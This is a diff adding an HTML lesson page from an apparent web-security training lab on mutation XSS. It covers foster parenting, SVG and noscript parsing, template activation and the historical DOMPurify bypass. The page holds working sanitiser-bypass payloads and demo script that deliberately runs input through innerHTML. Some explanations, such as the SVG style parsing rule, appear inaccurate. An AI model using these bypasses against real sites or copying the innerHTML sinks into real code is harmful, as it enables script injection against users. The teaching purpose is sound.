@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Module 13 — Attack Demo: Mutation XSS (mXSS)</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c;--purple:#a78bfa}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:24px;max-width:900px}
+  h1{font-size:20px;font-weight:700;color:var(--accent);margin-bottom:4px}
+  .subtitle{color:var(--muted);font-size:13px;margin-bottom:28px}
+  .step{background:var(--panel);border:1px solid var(--border);border-radius:8px;margin-bottom:20px;overflow:hidden}
+  .step-head{padding:14px 18px;display:flex;align-items:center;gap:12px;cursor:pointer;user-select:none}
+  .step-num{background:#1e3a5f;color:var(--accent);font-size:11px;font-weight:700;padding:3px 8px;border-radius:4px;flex-shrink:0}
+  .step-title{font-weight:600;font-size:14px;flex:1}
+  .step-tag{font-size:11px;padding:2px 8px;border-radius:3px}
+  .step-body{padding:18px;border-top:1px solid var(--border);display:none}
+  .step-body.open{display:block}
+  .concept{background:#060d1a;border-left:3px solid var(--accent);padding:10px 14px;border-radius:0 4px 4px 0;font-size:13px;color:var(--muted);margin-bottom:14px;line-height:1.6}
+  .concept strong{color:var(--text)}
+  code{font-family:'Courier New',monospace;font-size:12px;background:#060d1a;color:var(--accent);padding:2px 6px;border-radius:3px}
+  pre{background:#060d1a;border:1px solid var(--border);border-radius:5px;padding:12px 14px;overflow-x:auto;font-size:12px;line-height:1.6;color:var(--orange);margin:10px 0;white-space:pre-wrap}
+  .label{font-size:11px;color:var(--muted);margin-bottom:4px;font-weight:600;text-transform:uppercase;letter-spacing:.05em}
+  .row{display:flex;gap:10px;align-items:flex-start;flex-wrap:wrap;margin-bottom:10px}
+  input[type=text]{background:#060d1a;color:var(--text);border:1px solid var(--border);border-radius:4px;padding:8px 10px;font-size:13px;width:100%}
+  button{padding:8px 18px;border-radius:4px;border:1px solid var(--accent);background:#1e3a5f;color:var(--accent);font-size:13px;font-weight:600;cursor:pointer;white-space:nowrap}
+  button:hover{background:#2a4d7a}
+  .result{margin-top:10px;background:#060d1a;border:1px solid var(--border);border-radius:4px;padding:10px;font-size:12px;min-height:36px;color:var(--muted);white-space:pre-wrap;font-family:'Courier New',monospace;overflow-x:auto}
+  hr{border:none;border-top:1px solid var(--border);margin:14px 0}
+  .tag-mxss{background:rgba(167,139,250,.12);color:var(--purple);border:1px solid rgba(167,139,250,.3)}
+  .tag-parse{background:rgba(251,146,60,.12);color:var(--orange);border:1px solid rgba(251,146,60,.3)}
+  .tag-ns{background:rgba(56,189,248,.12);color:var(--accent);border:1px solid rgba(56,189,248,.3)}
+  .tag-ref{background:rgba(74,222,128,.12);color:var(--ok);border:1px solid rgba(74,222,128,.3)}
+  .live{background:#060d1a;border:1px solid var(--border);border-radius:4px;padding:10px;margin-top:8px;font-size:13px;min-height:36px}
+  a{color:var(--accent)}
+</style>
+</head>
+<body>
+
+<h1>Attack Demo 09 — Mutation XSS (mXSS)</h1>
+<p class="subtitle">Module 13 · The sanitiser approved it. The browser changed it. The payload fired anyway.</p>
+
+<!-- ─── STEP 1 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">01</span>
+    <span class="step-title">What is mXSS? — the serialise/parse gap</span>
+    <span class="step-tag tag-mxss">CONCEPT</span>
+  </div>
+  <div class="step-body open">
+    <div class="concept">
+      <strong>mXSS (Mutation XSS)</strong> occurs when:<br><br>
+      1. A sanitiser processes HTML string <em>S</em> and produces a clean output <em>S'</em><br>
+      2. <em>S'</em> is inserted into the DOM via <code>innerHTML</code><br>
+      3. The browser's HTML parser <strong>mutates</strong> <em>S'</em> into a different DOM tree <em>S''</em><br>
+      4. <em>S''</em> contains executable content that <em>S'</em> did not<br><br>
+      The sanitiser and the browser disagree on how to parse the same string. This gap is caused by the HTML5 parser's context-dependent rules: the same string parses differently depending on whether it is in the HTML namespace, SVG namespace, inside a table, inside a noscript element, or inside a template.
+    </div>
+    <div class="label">Live serialise/parse divergence demo</div>
+    <div class="concept">Type an HTML string below. Observe the difference between the raw string (what a sanitiser sees as text) and what the browser's innerHTML parser produces.</div>
+    <input type="text" id="s1-input" value="<table><td><img src=x onerror=alert(1)></td></table>" oninput="liveSerialise()">
+    <div class="label" style="margin-top:10px">innerHTML readback (what the browser actually parsed)</div>
+    <div id="s1-dom" class="result"></div>
+    <div class="label" style="margin-top:10px">Rendered output</div>
+    <div id="s1-rendered" class="live"></div>
+  </div>
+</div>
+
+<!-- ─── STEP 2 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">02</span>
+    <span class="step-title">Table foster parenting — content escapes its container</span>
+    <span class="step-tag tag-parse">FOSTER PARENTING</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      <strong>Foster parenting</strong> is the HTML5 parser rule that handles elements which are not valid inside a <code>&lt;table&gt;</code>. Instead of rejecting them, the parser <em>moves them</em> to just before the table element in the document. This is called "foster parenting" — the table adopts the misplaced content's position.
+    </div>
+    <pre>Input to sanitiser:  &lt;table&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/table&gt;
+Sanitiser sees:      img inside table — looks contained, no script tags
+Passes sanitiser as: &lt;table&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/table&gt;
+
+Browser innerHTML:   &lt;img src=x onerror=alert(1)&gt;&lt;table&gt;&lt;/table&gt;
+                     ↑ img moved BEFORE table via foster parenting
+                     ↑ onerror fires in document body context</pre>
+    <div class="label">Live demo — observe the DOM readback vs the input</div>
+    <input type="text" id="s2-input" value="<table><img src=x onerror=alert(1)></table>" oninput="liveTable()">
+    <div class="label" style="margin-top:8px">innerHTML readback (green = actual DOM, note img moved before table)</div>
+    <div id="s2-dom" class="result"></div>
+    <button onclick="openMXSS('table', document.getElementById('s2-input').value)" style="margin-top:8px">Test on /mxss/table</button>
+  </div>
+</div>
+
+<!-- ─── STEP 3 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">03</span>
+    <span class="step-title">SVG/HTML namespace boundary — style as raw text vs markup</span>
+    <span class="step-tag tag-ns">NAMESPACE</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      Inside an SVG element, <code>&lt;style&gt;</code> content is treated as raw text (CDATA) — the parser does not look for HTML tags inside it. When the SVG is serialised and re-inserted into HTML context via innerHTML, the <code>&lt;style&gt;</code> closes at the first <code>&lt;/style&gt;</code> token, and everything after it is parsed as HTML markup.
+    </div>
+    <pre>Payload: &lt;svg&gt;&lt;style&gt;&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/svg&gt;
+
+In SVG namespace: style content = everything until &lt;/style&gt; = empty
+After &lt;/style&gt;: &lt;img src=x onerror=alert(1)&gt; is HTML inside SVG
+→ SVG allows HTML elements via foreignObject context
+→ img onerror fires
+
+Classic DOMPurify bypass (historical):
+&lt;svg&gt;&lt;style&gt;&lt;a id="&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;
+SVG style sees:  &lt;a id="&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;  as text
+Serialised as:   &lt;svg&gt;&lt;style&gt;&lt;a id="&lt;/style&gt;&lt;img…&gt;
+Re-parsed HTML:  style ends at first &lt;/style&gt;, img is markup</pre>
+    <div class="label">Live namespace boundary demo</div>
+    <input type="text" id="s3-input" value="<svg><style></style><img src=x onerror=alert(1)></svg>" oninput="liveNS()">
+    <div id="s3-dom" class="result"></div>
+    <button onclick="openMXSS('namespace', document.getElementById('s3-input').value)" style="margin-top:8px">Test on /mxss/namespace</button>
+  </div>
+</div>
+
+<!-- ─── STEP 4 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">04</span>
+    <span class="step-title">&lt;noscript&gt; parsing — scripting context disagreement</span>
+    <span class="step-tag tag-parse">NOSCRIPT</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      <code>&lt;noscript&gt;</code> content is parsed in two completely different modes depending on whether scripting is enabled in the parser:<br><br>
+      <strong>Scripting ON:</strong> <code>&lt;noscript&gt;</code> content is raw text — tags inside are not parsed as HTML markup.<br>
+      <strong>Scripting OFF:</strong> <code>&lt;noscript&gt;</code> content is full HTML — tags inside execute as normal markup.<br><br>
+      A sanitiser library that runs with scripting disabled sees noscript content as HTML and sanitises it. When served to a browser with scripting enabled, the noscript content is raw text — the sanitiser's parsing model was wrong for the target environment. The bypass works in the opposite direction too.
+    </div>
+    <pre>Payload: &lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;
+
+Sanitiser (scripting OFF):
+  Parses noscript as HTML. Sees &lt;p title="...&gt;
+  Sanitises and passes as safe.
+
+Browser (scripting ON):
+  noscript = raw text. Entire content = string.
+  Re-parsed via innerHTML: noscript ends at &lt;/noscript&gt;.
+  Remaining: &lt;img src=x onerror=alert(1)&gt; is now HTML.
+  onerror fires.</pre>
+    <div class="label">Live noscript demo</div>
+    <input type="text" id="s4-input" value='<noscript><p title="</noscript><img src=x onerror=alert(1)>">' oninput="liveNoscript()">
+    <div id="s4-dom" class="result"></div>
+    <button onclick="openMXSS('noscript', document.getElementById('s4-input').value)" style="margin-top:8px">Test on /mxss/noscript</button>
+  </div>
+</div>
+
+<!-- ─── STEP 5 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">05</span>
+    <span class="step-title">&lt;template&gt; inert vs active context</span>
+    <span class="step-tag tag-parse">TEMPLATE</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      The HTML <code>&lt;template&gt;</code> element's content is parsed into a <strong>document fragment</strong> — an inert, disconnected subtree. Scripts and event handlers inside a template are <strong>not executed</strong> when the template element is created or when it is inserted into the DOM as a template element.<br><br>
+      However, when template content is cloned and appended to the document (<code>template.content.cloneNode(true)</code>), the cloned nodes become part of the live document and their event handlers activate.
+    </div>
+    <pre>Step 1: &lt;template&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/template&gt;
+  → Parsed. onerror does NOT fire. Content is in inert fragment.
+
+Step 2: document.body.appendChild(template.content.cloneNode(true))
+  → img is now in live document.
+  → src=x fails. onerror fires. alert(1).</pre>
+    <div class="label">Live template activation demo</div>
+    <div class="concept">Click "Activate Template" to clone the template content and append it to this page. If a payload is in the template, it fires on activation.</div>
+    <input type="text" id="s5-input" value="<img src=x onerror=alert(1)>">
+    <div class="row">
+      <button onclick="buildTemplate()">Build template (inert)</button>
+      <button onclick="activateTemplate()" style="border-color:#f87171;color:#f87171;background:rgba(248,113,113,.1)">Activate template (fires payload)</button>
+    </div>
+    <div class="label" style="margin-top:8px">Template innerHTML (inert — event handlers not yet active)</div>
+    <div id="s5-dom" class="result"></div>
+    <div class="label" style="margin-top:8px">After activation ↓</div>
+    <div id="s5-activated" class="live"></div>
+    <button onclick="openMXSS('template', document.getElementById('s5-input').value)" style="margin-top:8px">Test on /mxss/template</button>
+  </div>
+</div>
+
+<!-- ─── STEP 6 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">06</span>
+    <span class="step-title">innerHTML readback — the DOMPurify double-parse problem</span>
+    <span class="step-tag tag-mxss">DOMPURIFY</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      <strong>DOMPurify's historical vulnerability to mXSS:</strong> DOMPurify (before the fix in v2.0.17 and v3.x) inserted user HTML into a detached DOM node, read back the innerHTML, and sanitised the result. The problem: the first innerHTML insertion could mutate the HTML, and the readback produced a different string — which, when inserted into the real document, had already escaped sanitisation.
+    </div>
+    <pre>DOMPurify (old flow):
+1. div.innerHTML = userInput       ← mutation may occur here
+2. sanitise(div.innerHTML)         ← sanitiser sees mutated HTML
+3. target.innerHTML = sanitised    ← insertion of "safe" mutated string
+
+The mutation in step 1 produces a string that looks safe to the sanitiser
+in step 2, but when re-inserted in step 3, the browser's parser re-mutates
+it back into a form that contains executable content.</pre>
+    <div class="label">Simulate the double-parse</div>
+    <input type="text" id="s6-input" value="<table><td><img src=x onerror=alert(1)></td></table>">
+    <button onclick="doubleParseDemo()" style="margin-top:8px">Run double-parse simulation</button>
+    <div class="label" style="margin-top:10px">Pass 1: innerHTML readback (what sanitiser sees)</div>
+    <div id="s6-pass1" class="result"></div>
+    <div class="label" style="margin-top:8px">Pass 2: re-insert pass1 via innerHTML, read back again</div>
+    <div id="s6-pass2" class="result"></div>
+    <div class="concept" style="margin-top:10px">
+      <strong>The fix:</strong> Modern DOMPurify uses a two-pass sanitisation: apply rules, re-parse, re-apply rules, and only accept output when two consecutive passes produce identical serialised HTML. This ensures the sanitiser's model matches the browser's final parse.
+    </div>
+  </div>
+</div>
+
+<!-- ─── STEP 7 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">07</span>
+    <span class="step-title">mXSS reference — known mutation triggers</span>
+    <span class="step-tag tag-ref">REFERENCE</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">A categorised list of HTML parser behaviours that cause mutation. These are the properties a robust sanitiser must account for:</div>
+    <table style="width:100%;border-collapse:collapse;font-size:12px;margin-top:10px">
+      <thead><tr>
+        <th style="padding:6px 10px;background:#060d1a;color:#38bdf8;text-align:left;font-size:11px">Trigger</th>
+        <th style="padding:6px 10px;background:#060d1a;color:#38bdf8;text-align:left;font-size:11px">Mechanism</th>
+        <th style="padding:6px 10px;background:#060d1a;color:#38bdf8;text-align:left;font-size:11px">Example input → mutated output</th>
+      </tr></thead>
+      <tbody>
+        <tr><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#a78bfa">Foster parenting</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#7a9bbf">Non-table content inside table moved before table</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#fb923c"><code>&lt;table&gt;&lt;img&gt;&lt;/table&gt;</code> → <code>&lt;img&gt;&lt;table&gt;&lt;/table&gt;</code></td></tr>
+        <tr><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#a78bfa">Optional tag inference</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#7a9bbf">Missing &lt;tbody&gt;, &lt;tr&gt;, &lt;td&gt; inserted by parser</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#fb923c"><code>&lt;table&gt;&lt;td&gt;</code> → <code>&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;</code></td></tr>
+        <tr><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#a78bfa">SVG style/script as CDATA</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#7a9bbf">SVG style is raw text; HTML style terminates at &lt;/style&gt;</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#fb923c"><code>&lt;svg&gt;&lt;style&gt;&lt;/style&gt;&lt;img&gt;</code></td></tr>
+        <tr><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#a78bfa">foreignObject namespace</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#7a9bbf">Inside SVG foreignObject, HTML rules resume</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#fb923c"><code>&lt;svg&gt;&lt;foreignObject&gt;&lt;script&gt;&lt;/svg&gt;</code></td></tr>
+        <tr><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#a78bfa">noscript duality</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#7a9bbf">Parsed as HTML (scripting off) vs raw text (scripting on)</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#fb923c"><code>&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img&gt;"&gt;</code></td></tr>
+        <tr><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#a78bfa">template inert activation</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#7a9bbf">Template content inert until cloned into live document</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#fb923c"><code>&lt;template&gt;&lt;img onerror=…&gt;&lt;/template&gt;</code></td></tr>
+        <tr><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#a78bfa">MathML annotation-xml</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#7a9bbf">annotation-xml with encoding=text/html switches to HTML namespace</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#fb923c"><code>&lt;math&gt;&lt;annotation-xml encoding="text/html"&gt;&lt;img src=x onerror=…&gt;</code></td></tr>
+        <tr><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#a78bfa">Attribute value re-encoding</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#7a9bbf">HTML entities in attribute values decoded differently across contexts</td><td style="padding:6px 10px;border-top:1px solid #1e3a5f;color:#fb923c"><code>href="javascript&amp;#58;alert(1)"</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<script>
+function toggle(head) {
+  head.nextElementSibling.classList.toggle("open");
+}
+
+function openMXSS(route, payload) {
+  window.open("/mxss/" + route + "?q=" + encodeURIComponent(payload), "_blank");
+}
+
+// Step 1 — live serialise
+const _s1tmp = document.createElement("div");
+function liveSerialise() {
+  const val = document.getElementById("s1-input").value;
+  _s1tmp.innerHTML = val;
+  document.getElementById("s1-dom").textContent = _s1tmp.innerHTML;
+  document.getElementById("s1-rendered").innerHTML = val;
+}
+liveSerialise();
+
+// Step 2 — table foster parenting
+const _s2tmp = document.createElement("div");
+function liveTable() {
+  const val = document.getElementById("s2-input").value;
+  _s2tmp.innerHTML = val;
+  document.getElementById("s2-dom").textContent = _s2tmp.innerHTML;
+}
+liveTable();
+
+// Step 3 — namespace
+const _s3tmp = document.createElement("div");
+function liveNS() {
+  const val = document.getElementById("s3-input").value;
+  _s3tmp.innerHTML = val;
+  document.getElementById("s3-dom").textContent = _s3tmp.innerHTML;
+}
+liveNS();
+
+// Step 4 — noscript
+const _s4tmp = document.createElement("div");
+function liveNoscript() {
+  const val = document.getElementById("s4-input").value;
+  _s4tmp.innerHTML = val;
+  document.getElementById("s4-dom").textContent = _s4tmp.innerHTML;
+}
+liveNoscript();
+
+// Step 5 — template
+let _tmplEl = null;
+function buildTemplate() {
+  const val = document.getElementById("s5-input").value;
+  _tmplEl = document.createElement("template");
+  _tmplEl.innerHTML = val;
+  document.getElementById("s5-dom").textContent =
+    _tmplEl.content ? "[template fragment — " + _tmplEl.innerHTML + "]" : "(error)";
+}
+function activateTemplate() {
+  if (!_tmplEl) { buildTemplate(); }
+  const clone = _tmplEl.content.cloneNode(true);
+  const container = document.getElementById("s5-activated");
+  container.innerHTML = "";
+  container.appendChild(clone);
+}
+
+// Step 6 — double parse
+const _d1 = document.createElement("div");
+const _d2 = document.createElement("div");
+function doubleParseDemo() {
+  const val = document.getElementById("s6-input").value;
+  _d1.innerHTML = val;
+  const pass1 = _d1.innerHTML;
+  document.getElementById("s6-pass1").textContent = pass1;
+  _d2.innerHTML = pass1;
+  document.getElementById("s6-pass2").textContent = _d2.innerHTML;
+}
+</script>
+</body>
+</html>
